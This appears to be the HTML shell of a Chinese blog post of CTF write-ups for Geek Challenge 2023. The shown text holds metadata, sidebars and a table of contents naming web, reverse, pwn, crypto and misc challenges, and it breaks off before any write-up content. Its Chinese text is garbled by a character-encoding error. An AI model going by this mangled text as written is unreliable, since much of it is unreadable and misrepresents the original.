<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>Geek Challenge 2023 | Lazzaro</title><meta name="description" content="â€‹     ç¬¬åå››å±Šæå®¢å¤§æŒ‘æˆ˜ GEEK CHALLENGE 2023â€¼ï¸å¼€æ”¾æ³¨å†Œï¼š10æœˆ25æ—¥æ™š10ç‚¹æ¯”èµ›æ—¶é—´ï¼š10æœˆ26æ—¥æ™š8ç‚¹-11æœˆ26æ—¥æ™š8ç‚¹å¹³å°é“¾æ¥ï¼šhttps:&#x2F;&#x2F;game.sycsec.com&#x2F;èµ›é¢˜èŒƒå›´åŒ…æ‹¬reï¼Œwebï¼Œpwnï¼Œcryptoï¼Œmiscç­‰ç­‰ï¼Œæœ¬å±Šèµ›é¢˜è¿˜åŠ å…¥å…¨æ–°yakè¯­è¨€å…ƒç´ ï¼Œæ–¹å‘å¤šæ ·ï¼Œè¶£å‘³æ€§é«˜ã€‚æœ¬å±Šæ›´å¢æ·»æ ¡å¤–æ’è¡Œæ¦œï¼Œæ ¡å¤–çš„åŒå­¦ä»¬ç»„é˜Ÿå‚ä¸ä¹Ÿèƒ½è·å¾—åæ¬¡å¥–åŠ±ï¼Œæ¬¢è¿å¤§å®¶å‰æ¥æŒ‘"><meta property="og:type" content="article"><meta property="og:title" content="Geek Challenge 2023"><meta property="og:url" content="https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="â€‹     ç¬¬åå››å±Šæå®¢å¤§æŒ‘æˆ˜ GEEK CHALLENGE 2023â€¼ï¸å¼€æ”¾æ³¨å†Œï¼š10æœˆ25æ—¥æ™š10ç‚¹æ¯”èµ›æ—¶é—´ï¼š10æœˆ26æ—¥æ™š8ç‚¹-11æœˆ26æ—¥æ™š8ç‚¹å¹³å°é“¾æ¥ï¼šhttps:&#x2F;&#x2F;game.sycsec.com&#x2F;èµ›é¢˜èŒƒå›´åŒ…æ‹¬reï¼Œwebï¼Œpwnï¼Œcryptoï¼Œmiscç­‰ç­‰ï¼Œæœ¬å±Šèµ›é¢˜è¿˜åŠ å…¥å…¨æ–°yakè¯­è¨€å…ƒç´ ï¼Œæ–¹å‘å¤šæ ·ï¼Œè¶£å‘³æ€§é«˜ã€‚æœ¬å±Šæ›´å¢æ·»æ ¡å¤–æ’è¡Œæ¦œï¼Œæ ¡å¤–çš„åŒå­¦ä»¬ç»„é˜Ÿå‚ä¸ä¹Ÿèƒ½è·å¾—åæ¬¡å¥–åŠ±ï¼Œæ¬¢è¿å¤§å®¶å‰æ¥æŒ‘"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/download.jpg"><meta property="og:image" content="https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/m-1701104909234-1.png"><meta property="article:published_time" content="2023-11-27T10:28:02.000Z"><meta property="article:modified_time" content="2023-12-03T17:39:16.153Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="2023èµ›"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/download.jpg"><link rel="canonical" href="https://lazzzaro.github.io/2023/11/27/match-Geek-Challenge-2023/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link href="https://cdn.jsdelivr.net/npm/katex@0.9.0/dist/katex.min.css" rel="stylesheet"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFå¼±é¸¡è‡ªè¿›é˜¶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="æœç´¢"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">æ€»è§ˆ</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">æ±‡æ€»</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">ç±»åˆ«</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">å…³é”®è¯</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">æ¥ç•™ä¸ªè¨€ ğŸ‘‰ğŸ‘‰ğŸ‘‰</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">ç±»åˆ«</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">47</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">å…³é”®è¯äº‘</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020èµ›</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021èµ›</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022èµ›</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023èµ›</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13px">2024èµ›</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">å†…ç½‘</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">ååºåˆ—åŒ–</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">åç¼–è¯‘</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">åè°ƒè¯•</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">å–è¯</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">åé‡å­å¯†ç </a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">å‘½ä»¤è¡Œ</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">å›¾åƒ</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">å—å¯†ç </a> <a href="/tags/%E5%A0%86/" style="font-size:13px">å †</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">å¯†ç </a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">ææƒ</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">æ–‡ä»¶ä¸Šä¼ </a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">æ›²çº¿</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">æ ˆ</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">æ ¼å¯†ç </a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">æ³¨å…¥</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">æµå¯†ç </a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">æµé‡</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">æ··æ·†</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">æ¸—é€</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">ç¦»æ•£å¯¹æ•°</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">ç®—æ³•</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">ç»•è¿‡</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">ç¼–ç </a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">è„šæœ¬</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">è‡ªåŠ¨åŒ–</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">é€ƒé€¸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">éšå†™</a></div></div><div class="widget"><h3 class="widget-title">æ±‡æ€»</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">ä¸‰æœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">åä¸€æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">ä¹æœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">äº”æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">äºŒæœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">ä¸€æœˆ 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">åäºŒæœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">åä¸€æœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">ä¹æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">ä¸ƒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">å…­æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">äº”æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">äºŒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">ä¸€æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">åäºŒæœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">åä¸€æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">åæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">ä¹æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">å…«æœˆ 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">å…­æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">äº”æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">å››æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">ä¸‰æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">äºŒæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">ä¸€æœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">åäºŒæœˆ 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">åä¸€æœˆ 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">åæœˆ 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">ä¹æœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">å…«æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">ä¸ƒæœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">å…­æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">äº”æœˆ 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">æ–‡ç« ç›®å½•</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EzHttp"><span class="toc-number">1.1.</span> <span class="toc-text">EzHttp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsign"><span class="toc-number">1.2.</span> <span class="toc-text">unsign</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#n00b-Upload"><span class="toc-number">1.3.</span> <span class="toc-text">n00b_Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-php"><span class="toc-number">1.4.</span> <span class="toc-text">easy_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctf-curl"><span class="toc-number">1.5.</span> <span class="toc-text">ctf_curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#klf-ssti"><span class="toc-number">1.6.</span> <span class="toc-text">klf_ssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-remove"><span class="toc-number">1.7.</span> <span class="toc-text">ez_remove</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-path"><span class="toc-number">1.8.</span> <span class="toc-text">ez_path</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#you-konw-flask"><span class="toc-number">1.9.</span> <span class="toc-text">you konw flask?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pupyy-rce"><span class="toc-number">1.10.</span> <span class="toc-text">Pupyy_rce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9B%A8"><span class="toc-number">1.11.</span> <span class="toc-text">é›¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#famale-imp-l0ve"><span class="toc-number">1.12.</span> <span class="toc-text">famale_imp_l0ve</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#change-it"><span class="toc-number">1.13.</span> <span class="toc-text">change_it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezrfi"><span class="toc-number">1.14.</span> <span class="toc-text">ezrfi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzRce"><span class="toc-number">1.15.</span> <span class="toc-text">EzRce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpython"><span class="toc-number">1.16.</span> <span class="toc-text">ezpython</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-php"><span class="toc-number">1.17.</span> <span class="toc-text">ez_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#scan-tool"><span class="toc-number">1.18.</span> <span class="toc-text">scan_tool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#klf-2"><span class="toc-number">1.19.</span> <span class="toc-text">klf_2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EZ-Smuggling"><span class="toc-number">1.20.</span> <span class="toc-text">EZ_Smuggling</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#klf-3"><span class="toc-number">1.21.</span> <span class="toc-text">klf_3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Akane"><span class="toc-number">1.22.</span> <span class="toc-text">Akane!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RE"><span class="toc-number">2.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiftjmp"><span class="toc-number">2.1.</span> <span class="toc-text">shiftjmp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%87%BB%E5%B0%B1%E9%80%81%E7%9A%84%E9%80%86%E5%90%91%E9%A2%98"><span class="toc-number">2.2.</span> <span class="toc-text">ç‚¹å‡»å°±é€çš„é€†å‘é¢˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easymath"><span class="toc-number">2.3.</span> <span class="toc-text">easymath</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%B8%E8%BF%90%E6%95%B0%E5%AD%97"><span class="toc-number">2.4.</span> <span class="toc-text">å¹¸è¿æ•°å­—</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AC%E8%AF%B4cpp%E5%BE%88%E9%9A%BE%EF%BC%9F"><span class="toc-number">2.5.</span> <span class="toc-text">å¬è¯´cppå¾ˆéš¾ï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%8D%E6%A0%91"><span class="toc-number">2.6.</span> <span class="toc-text">ç æ ‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flower-or-tea"><span class="toc-number">2.7.</span> <span class="toc-text">flower-or-tea</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mySelf"><span class="toc-number">2.8.</span> <span class="toc-text">mySelf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rainbow"><span class="toc-number">2.9.</span> <span class="toc-text">rainbow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E9%BB%84%E9%B8%AD"><span class="toc-number">2.10.</span> <span class="toc-text">å°é»„é¸­</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%88%9D%E9%9F%B3%E6%9C%AA%E6%9D%A5"><span class="toc-number">2.11.</span> <span class="toc-text">å¯»æ‰¾åˆéŸ³æœªæ¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%AA%E6%BC%AB%E8%87%B3%E6%AD%BB%E4%B8%8D%E6%B8%9D"><span class="toc-number">2.12.</span> <span class="toc-text">æµªæ¼«è‡³æ­»ä¸æ¸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AES-AES"><span class="toc-number">2.13.</span> <span class="toc-text">AES! AES?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezandroid"><span class="toc-number">2.14.</span> <span class="toc-text">ezandroid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%AF%E7%94%B7%E4%BA%BA%E5%B0%B1%E6%9D%A5%E6%89%8E%E9%92%88"><span class="toc-number">2.15.</span> <span class="toc-text">æ˜¯ç”·äººå°±æ¥æ‰é’ˆ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nc-pwntools"><span class="toc-number">3.1.</span> <span class="toc-text">nc_pwntools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#password"><span class="toc-number">3.2.</span> <span class="toc-text">password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2text"><span class="toc-number">3.3.</span> <span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write1"><span class="toc-number">3.4.</span> <span class="toc-text">write1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc"><span class="toc-number">3.5.</span> <span class="toc-text">ret2libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezpwn"><span class="toc-number">3.6.</span> <span class="toc-text">ezpwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#write2"><span class="toc-number">3.7.</span> <span class="toc-text">write2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt1-0"><span class="toc-number">3.8.</span> <span class="toc-text">fmt1.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#white-canary"><span class="toc-number">3.9.</span> <span class="toc-text">white_canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-fullprotection"><span class="toc-number">3.10.</span> <span class="toc-text">ez_fullprotection</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRYPTO"><span class="toc-number">4.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SignIn"><span class="toc-number">4.1.</span> <span class="toc-text">SignIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proof-of-work"><span class="toc-number">4.2.</span> <span class="toc-text">proof_of_work</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleRSA"><span class="toc-number">4.3.</span> <span class="toc-text">SimpleRSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OTPTwice"><span class="toc-number">4.4.</span> <span class="toc-text">OTPTwice</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OldAlgorithm"><span class="toc-number">4.5.</span> <span class="toc-text">OldAlgorithm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-classic"><span class="toc-number">4.6.</span> <span class="toc-text">easy_classic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PolyRSA"><span class="toc-number">4.7.</span> <span class="toc-text">PolyRSA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Simple3DES"><span class="toc-number">4.8.</span> <span class="toc-text">Simple3DES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JPGDiff"><span class="toc-number">4.9.</span> <span class="toc-text">JPGDiff</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Energetic-Carcano"><span class="toc-number">4.10.</span> <span class="toc-text">Energetic_Carcano</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Just-need-One"><span class="toc-number">4.11.</span> <span class="toc-text">Just need One</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fi1nd-th3-x%E2%80%99"><span class="toc-number">4.12.</span> <span class="toc-text">Fi1nd_th3_xâ€™</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quick-Robert"><span class="toc-number">4.13.</span> <span class="toc-text">Quick_Robert</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Diligent-Liszt"><span class="toc-number">4.14.</span> <span class="toc-text">Diligent_Liszt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#card-game"><span class="toc-number">4.15.</span> <span class="toc-text">card_game</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EzComplex"><span class="toc-number">4.16.</span> <span class="toc-text">EzComplex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ext-7gcd"><span class="toc-number">4.17.</span> <span class="toc-text">ext^7gcd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Algebra"><span class="toc-number">4.18.</span> <span class="toc-text">Algebra</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">5.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cheekin"><span class="toc-number">5.1.</span> <span class="toc-text">cheekin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-smilemo"><span class="toc-number">5.2.</span> <span class="toc-text">ez_smilemo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DEATH-N0TE"><span class="toc-number">5.3.</span> <span class="toc-text">DEATH_N0TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E4%B8%80%E7%AB%99%E6%98%AF%E5%93%AA%E5%84%BF%E5%91%A2"><span class="toc-number">5.4.</span> <span class="toc-text">ä¸‹ä¸€ç«™æ˜¯å“ªå„¿å‘¢</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Qingwan%E5%BF%83%E9%83%BD%E8%A6%81%E7%A2%8E%E4%BA%86"><span class="toc-number">5.5.</span> <span class="toc-text">Qingwanå¿ƒéƒ½è¦ç¢äº†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xqr"><span class="toc-number">5.6.</span> <span class="toc-text">xqr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DEATH-N1TE"><span class="toc-number">5.7.</span> <span 